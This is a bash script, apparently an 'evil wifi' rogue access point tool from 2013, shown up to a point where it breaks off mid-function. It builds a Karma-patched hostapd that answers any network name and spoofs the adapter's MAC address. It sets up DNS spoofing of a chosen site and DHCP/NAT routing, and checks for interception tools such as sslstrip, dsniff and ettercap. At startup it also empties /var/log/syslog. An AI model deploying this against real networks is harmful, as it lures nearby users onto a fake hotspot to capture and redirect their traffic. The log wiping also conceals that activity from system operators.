#!/bin/bash
####################
#  CONFIG SECTION  #
####################
TAPIP=10.0.0.1             #ip address of moniface
NETMASK=255.255.0.0        #subnetmask
WILDCARD=0.0.255.255       #dunno what this is
# =>
NETWORK=10.0.0.0/16        #Network Size
TAPIPBLOCK=10.0.0.0        #subnet
DHCPS=10.0.0.1             #dhcp start range
DHCPE=10.0.255.254         #dhcp end range
BROADCAST=10.0.255.255     #broadcast address
# Hosts/Net 65534          #CLASS A, Private Internet
DHCPL=1h                   #time for dhcp lease
####################
AUTO_UPDATES=1             #Auto check for updated script
TESTING=0                  #test mode does not start anything just writes configs
SYSLOG_CHECK=0             #Seconds to check syslog is running
VERBOSE=0                  #
####################
#ipcalc_tmp=
#ADDRESS=$(cat $ipcalc_tmp | grep Address | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}')
#NETMASK=$(cat $ipcalc_tmp | grep Netmask | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}')
#WILDCARD=$(cat $ipcalc_tmp | grep WildCard | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}')
#NETWORK=
#HOSTMIN=$(cat $ipcalc_tmp | grep HostMin | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}')
#HOSTMAX=$(cat $ipcalc_tmp | grep HostMax | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}')
#BROADCAST=$(cat $ipcalc_tmp | grep Broadcast | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}')
function banner(){
clear
echo -e "
  _______                     ________        __
 |       |.-----.-----.-----.|  |  |  |.----.|  |_
 |   -   ||  _  |  -__|     ||  |  |  ||   _||   _|
 |_______||   __|_____|__|__||________||__|  |____|
          |__| W I R E L E S S   F R E E D O M
 -----------------------------------------------------
 PWNAGE EDITION (\033[0;31mVersion:\033[0;32m $release_date\033[0m, \033[0;31mRelease: \033[0;32mr$REVISION\033[0m)
 -----------------------------------------------------"
}
function DATETIME(){
datestamp=$(date +%F)
timestamp=$(date +%I-%M-%S-%p)
printf "$timestamp\n";
}
function setupenv(){
userprompt="root@OpenWRT:/# "
REVISION=055
release_date="08/10/2013"
mydistro="`awk '/DISTRIB_ID/' /etc/lsb-release | cut -d '=' -f2`"
myversion="`awk '/DISTRIB_RELEASE/' /etc/lsb-release | cut -d '=' -f2`"
myrelease="`awk '/DISTRIB_CODENAME/' /etc/lsb-release | cut -d '=' -f2`"
OK=`printf "\e[1;32m OK \e[0m"`
WARN=`printf "\e[1;33mWARN\e[0m"`
FAIL=`printf "\e[1;31mFAIL\e[0m"`
CRIT=`printf "\e[1;37mCRIT\e[0m"`
initpath=`pwd`
hostname=$(hostname)
resolution=$(xdpyinfo | grep 'dimensions:' | awk -F" " {'print $2'} | awk -F"x" {'print $1'})
folder=/tmp/.evilwifi
datestamp=$(date +%F)
timestamp=$(date +%I-%M-%S-%p)
sessionfolder=$folder/$datestamp/$timestamp;
settings=/etc/evilwifi.conf
lockfile=$folder/evilwifi.lock
dhcpconf=/etc/dhcp3/dhcpd.conf
hostapdconf=$sessionfolder/config/hostapd.conf
arpaaddr=$(echo $TAPIP|rev)
# if [ -f $lockfile ]; then echo "$lockfile Detected - Script Halted!"; exit 1; fi
if [ ! -d $folder ]; then mkdir $folder; fi
mkdir -p $sessionfolder;
touch $folder/currentsession.txt
echo "$sessionfolder" > $folder/currentsession.txt
mkdir $sessionfolder/logs;
mkdir $sessionfolder/pids;
mkdir $sessionfolder/pcaps;
mkdir $sessionfolder/config;
LOG=$sessionfolder/logs/evilwifi.log;
touch $sessionfolder/logs/pwned.log;
touch $sessionfolder/logs/dnsmasq.log;
touch $sessionfolder/logs/hostapd.log;
touch $sessionfolder/logs/evilwifi.log;
touch $sessionfolder/logs/missing.log;
touch $sessionfolder/logs/ipcalc.log
touch $sessionfolder/config/hostapd.deny;
touch $sessionfolder/config/hostapd.accept;
touch $lockfile;
echo > /var/log/syslog
}
function STARTTERM(){
if [ "$COLORTERM" = "xfce4-terminal" ]; then
xfce4-terminal --hide-menubar --title "$(echo $TERMTITLE)" -e "$(echo $TERMCMD)"; fi
if [ "$COLORTERM" = "gnome-terminal" ]; then
gnome-terminal --hide-menubar --title "$(echo $TERMTITLE)" -e "$(echo $TERMCMD)"; fi
if [ "$COLORTERM" = "xterm" ]; then
xterm +aw +bc +fullscreen -bg black -fg green -T "$(echo $TERMTITLE)" -e "$(echo $TERMCMD)"; fi
unset TERMGEO
unset TERMTITLE
unset TERMCMD
}
function debugenv(){
echo "###################################"
echo "# DEBUG MODE SHOWING ENV SETTINGS #"
echo "###################################"
echo "* REVISION: $REVISION *"
echo "* DISTRO: $mydistro *"
echo "* VERSION: $myversion *"
echo "* RELEASE: $myrelease *"
echo "* RESOLUTION: $resolution *"
echo "* OK: $OK *"
echo "* FAIL: $FAIL *"
echo "* CRIT: $CRIT *"
echo "* WARN: $WARN *"
echo "* INITPATH: $initpath *"
echo "* FOLDER: $folder *"
echo "* SESSION: $sessionfolder *"
echo "* LOCKFILE: $lockfile *"
echo "* SETTINGS: $settings *"
echo "* FIREWALL STATE:  *"
echo "###################################"
echo "# END OF DEBUG MODE AWWWWWWWWWWWW #"
echo "###################################"
}
function debugsettings(){
echo "###################################"
echo "# DEBUG MODE SHOWING AP SETTINGS  #"
echo "###################################"
echo "* ATHIFACE: $ATHIFACE *"
echo "* ATHIFACEMAC: $ATHIFACEMAC *"
echo "* ATHIP: $ATHIP *"
echo "* TAPIFACE: $TAPIFACE *"
echo "* TAPIFACEMAC: $TAPIFACEMAC *"
echo "* TAPIP: $TAPIP *"
echo "* WANIFACE: $WANIFACE *"
echo "* WANIFACEMAC: $WANIFACEMAC *"
echo "* WANIP: $WANIP *"
echo "* LANIFACE: $LANIFACE *"
echo "* LANIFACEMAC: $LANIFACEMAC *"
echo "* LANIP: $LANIP *"
echo "* MONIFACE: $MONIFACE *"
echo "* MONIFACEMAC: $MONIFACEMAC *"
echo "* MONIP: <n/a> *"
echo "* BRLANIFACE: $BRLANIFACE *"
echo "* BRLANIFACEMAC: $BRLANIFACEMAC *"
echo "* BRLANIP: $BRLANIP *"
echo "* *"
echo "* ACCESS POINT: $ESSID *"
echo "* CHANNEL: $CHAN *"
echo "* PACKETS PER SECOND: $PPS *"
echo "* BEACON INTERVAL: $BEAINT *"
echo "###################################"
echo "# END OF DEBUG MODE AWWWWWWWWWWWW #"
echo "###################################"
}
function injectiontest(){
printf "[>] Injection Test @ "; DATETIME;
aireplay-ng -9 $MONIFACE > $sessionfolder/logs/injectiontest.log
sleep 3
if grep -q 'Injection is working!' $sessionfolder/logs/injectiontest.log; then
echo "[$OK] Packet Injection Works!";
else
zenity --error --text "Injection is not working. Reconnect your wireless card and try again."
echo
exit
fi
}
function killscript(){
echo "Detected CTRL+C..."
stopshit
monitormodestop
cleanup
exit 0;
}
trap killscript INT HUP;
####################
# INTERNET TESTING #
####################
function icmptest(){
printf "| [ >> ] ICMP TEST @ "; DATETIME;

}
function pinginternet(){
printf "| [ >> ] WAN ICMP TEST @ "; DATETIME;
INTERNETTEST=$(awk '/bytes from/ { print $1 }' < <(ping 8.8.8.8 -c 1 -w 3))
if [ "$INTERNETTEST" = "64" ]; then INTERNET=TRUE;
WANIP=$(curl -s checkip.dyndns.org | grep -Eo '[0-9\.]+');
else INTERNET=FALSE; fi
if [ "$WANIP" != "" ]; then INTERNET=TRUE; else INTERNET=FALSE; fi
}
function dnscheck(){
printf "| [ >> ] DNS TEST @ "; DATETIME;
DNSCHECK=$(awk '/bytes from/ { print $1 }' < <(ping raw.github.com -c 1 -w 3))
if [ "$DNSCHECK" = "64" ]; then DNS=TRUE; else DNS=FALSE; fi
}
function pinggateway(){
printf "[ >> ] GATEWAY ICMP TEST @ "; DATETIME;
GATEWAYRDNS=$(awk '/br-lan/ && /UG/ {print $2}' < <(route))
GATEWAY=$(awk '/br-lan/ && /UG/ { print $2 }' < <(route -n))
echo "Pinging $GATEWAYRDNS [$GATEWAY] with 64 bytes of data:"
GATEWAYTEST=$(awk '/bytes from/ { print $1 }' < <(ping $GATEWAY -c 1 -w 3))
if [ "$GATEWAYTEST" = "64" ]; then echo "Reply from $GATEWAY: bytes=64"; else echo "Request timed out."; fi
}
function pingvictim(){
echo "Pinging $VICTIMRDNS [$VICTIM] with 64 bytes of data:"
ping $VICTIM -c 20 -W 1 | awk '/bytes from/ { print $5 }'
}
function checkupdate(){
echo "| [ >> ] RUNNING SCRIPT UPDATE CHECK                  |"
echo "+-----------------------------------------------------+"
newrevision=$(curl -s -B -L https://raw.github.com/CanadianJeff/BackTrack-5-Scripts/master/VERSION)
if [ "$newrevision" -gt "$REVISION" ]; then update;
else
echo "| [$OK] NO UPDATE REQUIRED                            |"
echo "+-----------------------------------------------------+";
fi
}
function update(){
echo ""
echo "+-----------------------------------------------------+"
echo "| ATTEMPTING TO DOWNLOAD UPDATE                       |"
echo "+-----------------------------------------------------+"
wget -a $sessionfolder/logs/wget.log -t 3 -T 10 -O /tmp/evilwifi.sh.tmp https://raw.github.com/CanadianJeff/BackTrack-5-Scripts/master/evilwifi.sh
if [ -f /tmp/evilwifi.sh.tmp ]; then rm -rf evilwifi.sh; mv /tmp/evilwifi.sh.tmp evilwifi.sh;
echo "| [ >> ] CHMOD 0755 & EXIT"
chmod 755 evilwifi.sh
read -e -p "| [$OK] Updated Press Enter To Exit " enter
echo "+-----------------------------------------------------+"
exit 0
else
echo "Update [$FAIL]..."
read -e -p "Try Again? " enter
update
fi
}
function forceupdate(){
update
}
######################
# DEPENDENCY SECTION #
######################
function depends(){
printf "| [ >> ] Dependency Check Started @ "; DATETIME;
if [ $UID -eq 0 ]; then echo "| [$OK] `id`";
else
echo "[$CRIT] Please Run This Script As Root or With Sudo!";
echo "";
exit 0; fi
echo "| [$OK] SCRIPT REVISION: $REVISION"
if [ -f $settings ]; then
echo "| [$OK] Config File Found!"; 
echo "| [ >> ] Loading Settings From $settings"
LOADCONF=0; else LOADCONF=0; fi
if [ "$mydistro" = "BackTrack" ]; then echo "| [$OK] $mydistro Version $myversion Release $myrelease"; fi
if [ "$mydistro" = "Kali" ]; then echo "| [$OK] $mydistro Release $myrelease"; fi
if [ "$mydistro" = "Ubuntu" ]; then echo "| [$OK] $mydistro Version $myversion"; fi
if [ "$INTERNET" = "FALSE" ]; then echo "| [$FAIL] No Internet Connection :-("; fi
if [ "$INTERNET" = "TRUE" ]; then echo "| [$OK] We Have Internet :-)"; dnscheck; fi
if [ "$ICMPBLOCK" = "TRUE" ]; then echo "| [$WARN] Outbound ICMP Ping Is Blocked WAN SIDE ($WANIP)"; fi
if [ "$DNS" = "FALSE" ]; then echo "| [$FAIL] DNS Error Cant Update Check"; fi
echo "| [ >> ] Removing Conflicting Installed Packages!";
dpkg -P --force-depends hostapd 2>/dev/null
echo "| [ >> ] Checking For Missing Packages!";
critarray=( aircrack-ng iptables dnsmasq xterm python macchanger wget perl brctl )
for depend in ${critarray[@]}; do
type -P $depend &>/dev/null || { echo "| [$CRIT] $depend"; echo "$depend" >> $sessionfolder/logs/missing.log; };
done
warnarray=( airdrop-ng arpspoof dpkg driftnet dsniff dhcpd3 dhcpd ettercap hostapd mdk3 msfconsole sslstrip urlsnarf svn nmap )
for depend in ${warnarray[@]}; do
type -P $depend &>/dev/null || { echo "| [$WARN] $depend"; echo "$depend" >> $sessionfolder/logs/missing.log; };
done
echo "| [ >> ] Saved To $sessionfolder/logs/missing.log";
}
function uninstalldeps(){
echo "[>] REMOVING AIRCRACK-NG!";
cd /usr/src/aircrack-ng;
make uninstall &>/dev/null;
cd /usr/src;
rm -rf aircrack-ng;
echo "[>] REMOVING HOSTAPD!";
cd /usr/src/hostapd-1.0-karma/hostapd;
make clean &>/dev/null;
rm -rf /usr/local/bin/hostapd;
rm -rf /usr/local/bin/hostapd_cli;
DATETIME
}
function installdeps(){
echo "[>] INSTALLING DEPENDS! (internet required)";
echo "[$WARN] PLEASE ENABLE UNIVERSE IN /etc/apt/sources.list!!!!";
apt-get update;
apt-get install libssl-dev -y;
apt-get install bridge-utils -y;
apt-get install libnl-dev -y;
# apt-get install python-dev -y;
[ -d "/usr/src/aircrack-ng" ] || installaircrack;
[ -d "/usr/src/hostapd-1.0-karma" ] || installhostapd;
installlighttpd;
DATETIME
}
function installaircrack(){
dpkg --force-depends --purge aircrack-ng;
echo "[>] INSTALLING AIRCRACK-NG! (internet required)";
cd /usr/src;
rm -rf aircrack-ng*;
echo "[>] CHECKING OUT AIRCRACK-NG!";
svn co http://svn.aircrack-ng.org/trunk/ aircrack-ng &>/dev/null;
DATETIME
cd aircrack-ng;
make uninstall &>/dev/null;
make clean &>/dev/null;
echo "[>] STARTING MAKE! (watch for errors)";
sleep 5;
make &>$sessionfolder/logs/aircrack_make.log;
make install &>$sessionfolder/logs/aircrack_make_install.log;
DATETIME
echo "[*] LOGS CAN BE FOUND IN $sessionfolder/logs/";
sleep 3;
airodump-ng-oui-update;
cd $initpath;
}
function installhostapd(){
echo "[>] INSTALLING HOSTAPD! (internet required)";
cd /usr/src;
wget -a $sessionfolder/logs/wget.log -t 3 -T 10 http://www.digininja.org/files/hostapd-1.0-karma.tar.bz2;
tar -xf hostapd-1.0-karma.tar.bz2;
cd hostapd-1.0-karma/hostapd/;
echo "[>] STARTING MAKE! (watch for errors)";
sleep 5;
make &>$sessionfolder/logs/hostapd_make.log;
make install &>$sessionfolder/logs/hostapd_make_install.log;
DATETIME
echo "[*] LOGS CAN BE FOUND IN $sessionfolder/logs/";
sleep 3;
cd $initpath;
}
####################
# PIDS AND CLEANUP #
####################
function pspids(){
pidarray=( airbase-ng dnsmasq hostapd dumpcap wireshark lighttpd )
for program in ${pidarray[@]}; do
pgrep $program > $sessionfolder/pids/$program.pid;
done
}
function stopshit(){
if [ "$BRLAN" = "up" ]; then brlandown; fi
pspids;
echo "Stopping Conflicting Services...";
service lighttpd stop &>>$LOG;
# service apache2 stop &>>$LOG;
service dhcp3-server stop &>>$LOG;
service avahi-daemon stop &>>$LOG;
service network-manager stop &>>$LOG;
# service networking stop &>>$LOG;
echo "DONE"
while [ -s $sessionfolder/pids/airbase-ng.pid ]; do
sleep 2;
pspids;
echo "Killing Airbase-NG";
kill `awk '{ print $1 }' < <(cat $sessionfolder/pids/airbase-ng.pid)` &>/dev/null;
done
while [ -s $sessionfolder/pids/hostapd.pid ]; do
airmon-ng stop mon.$TAPIFACE &>/dev/null;
sleep 2;
pspids;
echo "Killing Hostapd";
kill -9 `awk '{ print $1 }' < <(cat $sessionfolder/pids/hostapd.pid)` &>/dev/null;
done
while [ -s $sessionfolder/pids/dnsmasq.pid ]; do
sleep 2;
pspids;
echo "Killing DNSMASQ";
kill `awk '{ print $1 }' < <(cat $sessionfolder/pids/dnsmasq.pid)` &>/dev/null;
done
while [ -s $sessionfolder/pids/dumpcap.pid ]; do
sleep 2;
pspids;
echo "Killing DUMPCAP";
kill `awk '{ print $1 }' < <(cat $sessionfolder/pids/dumpcap.pid)` &>/dev/null;
done
for pid in `ls $sessionfolder/pids/*.pid 2>$LOG`; do if [ -s "$pid" ]; then
kill `cat $pid 2>$LOG` &>/dev/null;
fi; done
if [ -f /var/run/dhcpd/$TAPIFACE.pid ]; then
kill `cat /var/run/dhcpd/$TAPIFACE.pid 2>$LOG` &>/dev/null;
fi
killall -9 airodump-ng aireplay-ng mdk3 driftnet urlsnarf dsniff &>/dev/null
fw_stop
}
function cleanup(){
echo "nameserver 8.8.8.8" > /etc/resolv.conf
echo > $dhcpconf
rm -rf $lockfile
# service network-manager restart
# mv $APACHECONF/default~ $APACHECONF/default
}
###################
# CONF FILE MAKER #
###################
function settings(){
echo ""
echo "+-----------------------------------------------------+"
echo "| Listing Network Devices                             |"
echo "+-----------------------------------------------------+"
# airmon-ng | awk '/phy/ {print $1}'
ifconfig | awk '/Link encap:Eth/ {print;getline;print}' | sed '{ N; s/\n/ /; s/Link en.*.HWaddr//g; s/ Bcast.*//g; s/UP.*.:1//g; s/inet addr/IP/g; }' | sed '$a\\n'
echo "+-----------------------------------------------------+"
echo ""
echo "Pressing Enter Uses Default Settings"
echo ""
read -e -p "Internet or WAN Interface [eth0]: " WANIFACE
if [ "$WANIFACE" = "" ]; then WANIFACE=eth0; fi
read -e -p "Create Bridge Interface [br-lan]: " BRLANIFACE
if [ "$BRLANIFACE" = "" ]; then BRLANIFACE=br-lan; fi
read -e -p "RF Moniter Interface [wlan0]: " ATHIFACE
if [ "$ATHIFACE" = "" ]; then ATHIFACE=wlan0; fi
ifconfig $ATHIFACE down
sleep 2
iwconfig $ATHIFACE mode managed
ifconfig $ATHIFACE up
ATHIFACEMAC=$(awk '/HWaddr/ { print $5 }' < <(ifconfig $ATHIFACE))
read -e -p "Spoof MAC Addres For $ATHIFACE [$ATHIFACEMAC]: " SPOOFMAC
read -e -p "What SSID Do You Want To Use [WiFi]: " ESSID
if [ "$ESSID" = "" ]; then ESSID=WiFi; fi
read -e -p "What CHANNEL Do You Want To Use [1]: " CHAN
if [ "$CHAN" = "" ]; then CHAN=1; fi
read -e -p "Select your MTU setting [7981]: " MTU
if [ "$MTU" = "" ]; then MTU=7981; fi
if [ "$MODE" = "4" ]; then 
read -e -p "Targets MAC Address: " TARGETMAC
fi
read -e -p "Beacon Intervals [100]: " BEAINT
if [ "$BEAINT" = "" ]; then BEAINT=100; fi
if [ "$BEAINT" -lt "10" ]; then BEAINT=100; fi
read -e -p "Packets Per Second [100]: " PPS
if [ "$PPS" = "" ]; then PPS=100; fi
if [ "$PPS" -lt "100" ]; then PPS=100; fi
read -e -p "DNS Spoof What Website [#]: " DNSURL
if [ "$DNSURL" = "" ]; then DNSURL=\#; fi
echo ""
echo "[>] CREATING .CONF FILE WITH SETTINGS...";
echo "ATHIFACE=$ATHIFACE" > $settings
echo "WANIFACE=$WANIFACE" >> $settings
echo "BRLANIFACE=$BRLANIFACE" >> $settings
echo "SPOOFMAC=$SPOOFMAC" >> $settings
echo "ESSID=$ESSID" >> $settings
echo "CHAN=$CHAN" >> $settings
echo "MTU=$MTU" >> $settings
echo "BEACONS=$BEAINT" >> $settings
echo "PPS=$PPS" >> $settings
echo "DNS=$DNSURL" >> $settings
echo ""
echo "Please Take This Time To Check And Verify [$settings]"
echo ""
read -e -p "Press Enter To Continue" enter
echo ""
}
######################
# CONF FILES SECTION #
######################
function hostapdnokarmaconfig(){
echo "driver=nl80211" > $hostapdconf
echo "enable_karma=0" >> $hostapdconf
echo "karma_black_white=1" >> $hostapdconf
echo "interface=$ATHIFACE" >> $hostapdconf
echo "logger_syslog=0" >> $hostapdconf
echo "logger_syslog_level=0" >> $hostapdconf
echo "logger_stdout=2" >> $hostapdconf
echo "dump_file=$sessionfolder/logs/hostapd.dump" >> $hostapdconf
echo "ctrl_interface=/var/run/hostapd" >> $hostapdconf
echo "ctrl_interface_group=0" >> $hostapdconf
echo "ssid=$ESSID" >> $hostapdconf
echo "hw_mode=g" >> $hostapdconf
echo "channel=$CHAN" >> $hostapdconf
echo "beacon_int=$BEAINT" >> $hostapdconf
echo "dtim_period=2" >> $hostapdconf
echo "max_num_sta=2000" >> $hostapdconf
echo "rts_threshold=2347" >> $hostapdconf
echo "fragm_threshold=2346" >> $hostapdconf
echo "macaddr_acl=0" >> $hostapdconf
echo "accept_mac_file=$sessionfolder/config/hostapd.accept" >> $hostapdconf
echo "deny_mac_file=$sessionfolder/config/hostapd.deny" >> $hostapdconf
echo "auth_algs=3" >> $hostapdconf
echo "ignore_broadcast_ssid=0" >> $hostapdconf
#echo "wep_default_key=0" >> $hostapdconf
#echo "wep_key0=123456789a" >> $hostapdconf
echo "ap_max_inactivity=300" >> $hostapdconf
echo "disassoc_low_ack=1" >> $hostapdconf
#echo "ap_isolate=1" >> $hostapdconf
#echo "ieee80211n=1" >> $hostapdconf
#echo "access_network_type=0" >> $hostapdconf
}
function hostapdkarmaconfig(){
echo "driver=nl80211" > $hostapdconf
echo "enable_karma=1" >> $hostapdconf
echo "karma_black_white=1" >> $hostapdconf
echo "interface=$ATHIFACE" >> $hostapdconf
echo "logger_syslog=0" >> $hostapdconf
echo "logger_syslog_level=0" >> $hostapdconf
echo "logger_stdout=2" >> $hostapdconf
echo "dump_file=$sessionfolder/logs/hostapd.dump" >> $hostapdconf
echo "ctrl_interface=/var/run/hostapd" >> $hostapdconf
echo "ctrl_interface_group=0" >> $hostapdconf
echo "ssid=$ESSID" >> $hostapdconf
echo "hw_mode=g" >> $hostapdconf
echo "channel=$CHAN" >> $hostapdconf
echo "beacon_int=$BEAINT" >> $hostapdconf
echo "dtim_period=2" >> $hostapdconf
echo "max_num_sta=2000" >> $hostapdconf
echo "rts_threshold=2347" >> $hostapdconf
echo "fragm_threshold=2346" >> $hostapdconf
echo "macaddr_acl=0" >> $hostapdconf
echo "accept_mac_file=$sessionfolder/config/hostapd.accept" >> $hostapdconf
echo "deny_mac_file=$sessionfolder/config/hostapd.deny" >> $hostapdconf
echo "auth_algs=3" >> $hostapdconf
echo "ignore_broadcast_ssid=0" >> $hostapdconf
#echo "wep_default_key=0" >> $hostapdconf
#echo "wep_key0=123456789a" >> $hostapdconf
echo "ap_max_inactivity=300" >> $hostapdconf
echo "disassoc_low_ack=1" >> $hostapdconf
#echo "ap_isolate=1" >> $hostapdconf
#echo "ieee80211n=1" >> $hostapdconf
#echo "access_network_type=0" >> $hostapdconf
}
function dhcpd3config(){
echo "* DHCPD3 SERVER!!! *"
replace INTERFACES=\"\" INTERFACES=\"$TAPIFACE\" -- /etc/default/dhcp3-server
echo "" > /var/lib/dhcp3/dhcpd.leases
mkdir -p /var/run/dhcpd && chown dhcpd.dhcpd /var/run/dhcpd;
dhcpconf=/etc/dhcp3/dhcpd.conf
echo "ddns-update-style none;" > $dhcpconf
echo "default-lease-time 600;" >> $dhcpconf
echo "max-lease-time 7200;" >> $dhcpconf
echo "" >> $dhcpconf
echo "log-facility local7;" >> $dhcpconf
#echo "local7.* $folder/dhcpd.log" > /etc/rsyslog.d/dhcpd.conf
echo "" >> $dhcpconf
echo "authoritative;" >> $dhcpconf
echo "" >> $dhcpconf
#echo "shared-network NetworkName {" >> $dhcpconf
echo "subnet $TAPIPBLOCK netmask $NETMASK {" >> $dhcpconf
#echo "option subnet-mask $NETMASK;" >> $dhcpconf
#echo "option broadcast-address $BROADCAST;" >> $dhcpconf
echo "option domain-name backtrack-linux;" >> $dhcpconf
echo "option domain-name-servers $TAPIP;" >> $dhcpconf
echo "option routers $TAPIP;" >> $dhcpconf
echo "range $DHCPS $DHCPE;" >> $dhcpconf
echo "allow unknown-clients;" >> $dhcpconf
echo "one-lease-per-client false;" >> $dhcpconf
echo "}" >> $dhcpconf
#echo "}" >> $dhcpconf
dhcpdserver
}
function dnsmasqconfig(){
dnsmasqconf=$sessionfolder/config/dnsmasq.conf
echo "dhcp-authoritative" > $dnsmasqconf
echo "domain-needed" >> $dnsmasqconf
echo "localise-queries" >> $dnsmasqconf
#echo "read-ethers" >> $dnsmasqconf
#echo "bogus-priv" >> $dnsmasqconf
#echo "enable-tftp" >> $dnsmasqconf
echo "domain=wirelesslan" >> $dnsmasqconf
echo "server=/wirelesslan/" >> $dnsmasqconf
echo "dhcp-leasefile=$sessionfolder/dnsmasq.leases" >> $dnsmasqconf
echo "resolv-file=$sessionfolder/resolv.conf.auto" >> $dnsmasqconf
echo "log-facility=$sessionfolder/logs/dnsmasq.log" >> $dnsmasqconf
#echo "tftp-root=/usb/tftpboot" >> $dnsmasqconf
#echo "dhcp-boot=pxelinux.0" >> $dnsmasqconf
echo "stop-dns-rebind" >> $dnsmasqconf
echo "" >> $dnsmasqconf
echo "dhcp-host=$ATHIFACEMAC,$TAPIP" >> $dnsmasqconf
echo "" >> $dnsmasqconf
echo "address=/$DNSURL/$TAPIP" >> $dnsmasqconf
echo "ptr-record=$arpaaddr.in-addr.arpa,$hostname" >> $dnsmasqconf
echo "" >> $dnsmasqconf
echo "dhcp-range=wirelesslan,$DHCPS,$DHCPE,$NETMASK,$DHCPL" >> $dnsmasqconf
echo "no-dhcp-interface=$WANIFACE" >> $dnsmasqconf
echo "" >> $dnsmasqconf
echo "# Anything Under This Is Custom Added!" >> $dnsmasqconf
echo "" >> $dnsmasqconf
echo "log-queries" >> $dnsmasqconf
echo "log-dhcp" >> $dnsmasqconf
#echo "expand-hosts" >> $dnsmasqconf
echo "interface=$BRLANIFACE" >> $dnsmasqconf
echo "dhcp-lease-max=102" >> $dnsmasqconf
echo "dhcp-option=wirelesslan,3,$TAPIP" >> $dnsmasqconf
echo "dhcp-option=252,\"\n\"" >> $dnsmasqconf
#echo "dhcp-option=wirelesslan,3," >> $dnsmasqconf
echo "nameserver $TAPIP" > $sessionfolder/resolv.conf.auto
if [ "$mode" = "1" ]; then startdnsmasq; fi
if [ "$mode" = "2" ]; then startdnsmasqresolv; fi
}
function lighttpdconfig(){
echo "docroot=/var/www" > /etc/lighttpd.conf
echo "" >> /etc/lighttpd.conf
echo "server.modules              = (" >> /etc/lighttpd.conf
echo " \"mod_access\"," >> /etc/lighttpd.conf
echo " \"mod_alias\"," >> /etc/lighttpd.conf
echo " \"mod_accesslog\"," >> /etc/lighttpd.conf
echo " \"mod_rewrite\"" >> /etc/lighttpd.conf
echo ")" >> /etc/lighttpd.conf
echo "" >> /etc/lighttpd.conf
echo "server.document-root = \"$docroot/evilwifi\"" >> /etc/lighttpd.conf
echo "server.upload-dirs = ( \"/var/cache/lighttpd/uploads\" )" >> /etc/lighttpd.conf
echo "server.errorlog = \"$sessionfolder/logs/lighttpd/error.log\"" >> /etc/lighttpd.conf
echo "accesslog.filename = \"$sessionfolder/logs/lighttpd/access.log\"" >> /etc/lighttpd.conf
echo "index-file.names = ( \"index.php\" )" >> /etc/lighttpd.conf
echo "# url.access-deny = ( \"~\", \".inc\" )" >> /etc/lighttpd.conf
echo "static-file.exclude-extensions = ( \".php\", \".pl\", \".fcgi\" )" >> /etc/lighttpd.conf
echo "server.port = 31337" >> /etc/lighttpd.conf
echo "# server.bind = \"localhost\"" >> /etc/lighttpd.conf
echo "server.pid-file = \"$sessionfolder/pids/lighttpd.pid\"" >> /etc/lighttpd.conf
echo "server.dir-listing = \"disable\"" >> /etc/lighttpd.conf
echo "# server.chroot = \"/\"" >> /etc/lighttpd.conf
echo "# server.username = \"root\"" >> /etc/lighttpd.conf
echo "# server.groupname = \"root\"" >> /etc/lighttpd.conf
}
####################
# FIREWALL RELATED #
####################
function fw_start(){
fw_init
# fw_is_loaded && {
# echo "Firewall already loaded" >&2
# exit 1
echo "Loading defaults"
fw_default
echo "Loading synflood protection"
fw_synflood
echo "Loading zones"
fw_zones
echo "Loading forwardings"
fw_wan
echo "Loading LAN rules"
fw_lan_rules
if [ "$WANIP" != "" ]; then
echo "Loading WAN rules"
fw_wan_rules
echo "Loading redirects"
fw_natreflection
fi
echo "Loading includes"
# fw_includes
# fw_custom
fw_logs
echo "Loading interfaces"
fw_interfaces
echo "1" > /proc/sys/net/ipv4/ip_forward
}
function fw_stop(){
fw_init
echo "Flushing firewall"
iptables --table filter --policy INPUT ACCEPT
iptables --table filter --policy OUTPUT ACCEPT
iptables --table filter --policy FORWARD ACCEPT
iptables --table filter --flush
iptables --table filter --delete-chain
iptables --table mangle --flush
iptables --table mangle --delete-chain
iptables --table nat --flush
iptables --table nat --delete-chain
iptables --table raw --flush
iptables --table raw --delete-chain
# fw_stop_extra
echo "0" > /proc/sys/net/ipv4/ip_forward
FW_INITIALIZED=0
}
function fw_restart(){
fw_stop
fw_start
}
function fw_reload(){
fw_restart
}
function fw_is_loaded(){
echo ""
}
function fw_init(){
# [ -z "$FW_INITIALIZED" ] || return 0
# scan_interfaces
FW_INITIALIZED=1
# return 0
}
function fw_default(){
iptables --table filter --new-chain syn_flood
iptables --table filter --new-chain input
iptables --table filter --new-chain input_lan
iptables --table filter --new-chain input_rule
iptables --table filter --new-chain input_wan
iptables --table filter --new-chain output
iptables --table filter --new-chain output_rule
iptables --table filter --new-chain forward
iptables --table filter --new-chain forwarding_lan
iptables --table filter --new-chain forwarding_rule
iptables --table filter --new-chain forwarding_wan
iptables --table filter --new-chain logaccept
iptables --table filter --new-chain logdrop
iptables --table filter --new-chain logbrute
iptables --table filter --new-chain logreject
iptables --table filter --new-chain nat_reflection_fwd
iptables --table filter --new-chain reject
iptables --table filter --new-chain zone_lan_ACCEPT
iptables --table filter --new-chain zone_lan_DROP
iptables --table filter --new-chain zone_lan_REJECT
iptables --table filter --new-chain zone_lan
iptables --table filter --new-chain zone_lan_forward
iptables --table filter --new-chain zone_wan_ACCEPT
iptables --table filter --new-chain zone_wan_DROP
iptables --table filter --new-chain zone_wan_REJECT
iptables --table filter --new-chain zone_wan
iptables --table filter --new-chain zone_wan_forward
iptables --table nat --new-chain prerouting_lan
iptables --table nat --new-chain prerouting_rule
iptables --table nat --new-chain prerouting_wan
iptables --table nat --new-chain postrouting_rule
iptables --table nat --new-chain nat_reflection_in
iptables --table nat --new-chain nat_reflection_out
iptables --table nat --new-chain zone_lan_nat
iptables --table nat --new-chain zone_lan_prerouting
iptables --table nat --new-chain zone_wan_nat
iptables --table nat --new-chain zone_wan_prerouting
iptables --table raw --new-chain zone_lan_notrack
iptables --table raw --new-chain zone_wan_notrack
iptables --table mangle --new-chain zone_wan_MSSFIX
iptables --table mangle --new-chain internet
}
function fw_synflood(){
